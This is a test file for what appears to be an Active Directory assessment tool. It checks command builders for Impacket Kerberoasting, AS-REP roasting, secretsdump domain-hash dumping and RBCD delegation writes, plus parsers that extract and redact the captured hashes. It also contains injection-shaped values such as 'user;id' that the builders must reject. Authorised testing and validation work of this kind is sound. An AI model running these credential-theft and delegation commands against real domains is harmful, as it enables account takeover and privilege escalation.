import { describe, expect, it } from 'vitest'
import { buildKerberoastArgv, parseKerberoastHashes } from '../src/kerberoast.ts'
import { buildAsrepRoastArgv, parseAsrepRoastHashes } from '../src/asreproast.ts'
import { buildSecretsDumpArgv, parseSecretsDumpRows, redactSecretsRows } from '../src/secretsdump.ts'
import { buildRbcdArgv } from '../src/rbcd.ts'

const BASE = {
  domain: 'lab.example.invalid',
  username: 'svc-scan',
  password: 'resolved-secret',
  credentialRef: 'ASSESS_AD_PASS',
} as const

describe('buildKerberoastArgv', () => {
  it('builds a hashcat-format request with the secret in the target argument', () => {
    const argv = buildKerberoastArgv('/usr/bin/impacket-GetUserSPNs', { ...BASE })
    expect(argv).toEqual([
      '/usr/bin/impacket-GetUserSPNs', '-request', '-outputformat', 'hashcat',
      'lab.example.invalid/svc-scan:resolved-secret',
    ])
  })

  it('adds -dc-ip and rejects injection-shaped inputs', () => {
    const argv = buildKerberoastArgv('impacket-GetUserSPNs', { ...BASE, dcIp: '10.0.0.10' })
    expect(argv).toContain('-dc-ip')
    expect(argv).toContain('10.0.0.10')
    expect(() => buildKerberoastArgv('impacket-GetUserSPNs', { ...BASE, domain: '-request' })).toThrow(TypeError)
    expect(() => buildKerberoastArgv('impacket-GetUserSPNs', { ...BASE, username: 'user;id' })).toThrow(TypeError)
    expect(() => buildKerberoastArgv('impacket-GetUserSPNs', { ...BASE, credentialRef: 'bad ref!' })).toThrow(TypeError)
  })
})

describe('parseKerberoastHashes', () => {
  it('extracts john- and hashcat-format rows with accounts', () => {
    const rows = parseKerberoastHashes([
      'ServicePrincipalName : MSSQLSvc/db.lab.example.invalid',
      '$krb5tgs$23$*sqlsvc$LAB.EXAMPLE.INVALID$MSSQLSvc/db.lab.example.invalid*$aaaa',
      '$krb5tgs$23$websvc$LAB.EXAMPLE.INVALID$http/web$bbbb',
      'Impacket v0.12.0 - Copyright Fortra',
      '',
    ].join('\n'))
    expect(rows).toEqual([
      { account: 'sqlsvc', hash: '$krb5tgs$23$*sqlsvc$LAB.EXAMPLE.INVALID$MSSQLSvc/db.lab.example.invalid*$aaaa' },
      { account: 'websvc', hash: '$krb5tgs$23$websvc$LAB.EXAMPLE.INVALID$http/web$bbbb' },
    ])
  })
})

describe('buildAsrepRoastArgv', () => {
  it('builds an authenticated enumeration request without list files', () => {
    const argv = buildAsrepRoastArgv('impacket-GetNPUsers', { ...BASE })
    expect(argv).toEqual([
      'impacket-GetNPUsers', '-request', '-outputformat', 'hashcat',
      'lab.example.invalid/svc-scan:resolved-secret',
    ])
    expect(() => buildAsrepRoastArgv('impacket-GetNPUsers', { ...BASE, domain: 'nodot' })).toThrow(TypeError)
  })
})

describe('parseAsrepRoastHashes', () => {
  it('extracts asrep hash rows', () => {
    const rows = parseAsrepRoastHashes('$krb5asrep$23$*legacy$LAB.EXAMPLE.INVALID$cccc\nnoise')
    expect(rows).toEqual([{ account: 'legacy', hash: '$krb5asrep$23$*legacy$LAB.EXAMPLE.INVALID$cccc' }])
  })
})

describe('buildSecretsDumpArgv', () => {
  it('builds a local dump and a -just-dc directory dump', () => {
    expect(buildSecretsDumpArgv('impacket-secretsdump', { ...BASE, target: '10.0.0.5' })).toEqual([
      'impacket-secretsdump',
      'lab.example.invalid/svc-scan:resolved-secret@10.0.0.5',
    ])
    expect(buildSecretsDumpArgv('impacket-secretsdump', { ...BASE, target: 'dc01.lab.example.invalid', dcIp: '10.0.0.10', justDc: true })).toEqual([
      'impacket-secretsdump', '-dc-ip', '10.0.0.10', '-just-dc',
      'lab.example.invalid/svc-scan:resolved-secret@dc01.lab.example.invalid',
    ])
    expect(() => buildSecretsDumpArgv('impacket-secretsdump', { ...BASE, target: '-p' })).toThrow(TypeError)
  })
})

describe('parseSecretsDumpRows and redactSecretsRows', () => {
  const FIXTURE = [
    '[*] Target system boot key: 0x1234',
    'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c:::',
    'GUEST:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c:::',
    'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e9cfe0d16ae931b73c59d7e0c089c1:::',
    '[-] Zapping BCKEY',
  ].join('\n')

  it('extracts account/rid/hash rows and skips banners', () => {
    const rows = parseSecretsDumpRows(FIXTURE)
    expect(rows).toEqual([
      { account: 'Administrator', rid: 500, lmHash: 'aad3b435b51404eeaad3b435b51404ee', ntHash: '31d6cfe0d16ae931b73c59d7e0c089c' },
      { account: 'GUEST', rid: 501, lmHash: 'aad3b435b51404eeaad3b435b51404ee', ntHash: '31d6cfe0d16ae931b73c59d7e0c089c' },
      { account: 'krbtgt', rid: 502, lmHash: 'aad3b435b51404eeaad3b435b51404ee', ntHash: '0e9cfe0d16ae931b73c59d7e0c089c1' },
    ])
  })

  it('keeps hashes at full level and replaces them at masked level', () => {
    const rows = parseSecretsDumpRows(FIXTURE)
    expect(redactSecretsRows(rows, 'full')).toBe(rows)
    expect(redactSecretsRows(rows, 'masked')).toEqual([
      { account: 'Administrator', rid: 500, lmHash: '[redacted]', ntHash: '[redacted]' },
      { account: 'GUEST', rid: 501, lmHash: '[redacted]', ntHash: '[redacted]' },
      { account: 'krbtgt', rid: 502, lmHash: '[redacted]', ntHash: '[redacted]' },
    ])
  })
})

describe('buildRbcdArgv', () => {
  it('builds a fixed write action with delegate-from and the secret in the target argument', () => {
    expect(buildRbcdArgv('impacket-rbcd', {
      ...BASE,
      target: 'ws01.lab.example.invalid',
      delegateFrom: 'EVIL-WS$',
    })).toEqual([
      'impacket-rbcd', '-delegate-from', 'EVIL-WS$', '-action', 'write',
      'lab.example.invalid/svc-scan:resolved-secret@ws01.lab.example.invalid',
    ])
    expect(buildRbcdArgv('impacket-rbcd', {
      ...BASE,
      target: 'ws01.lab.example.invalid',
      delegateFrom: 'EVIL-WS$',
      dcIp: '10.0.0.10',
    })).toContain('-dc-ip')
  })

  it('rejects injection-shaped targets and delegate accounts', () => {
    expect(() => buildRbcdArgv('impacket-rbcd', { ...BASE, target: '-action', delegateFrom: 'EVIL-WS$' })).toThrow(TypeError)
    expect(() => buildRbcdArgv('impacket-rbcd', { ...BASE, target: 'ws01.lab.example.invalid', delegateFrom: 'a;id' })).toThrow(TypeError)
    expect(() => buildRbcdArgv('impacket-rbcd', { ...BASE, target: 'ws01.lab.example.invalid', delegateFrom: '' })).toThrow(TypeError)
  })
})
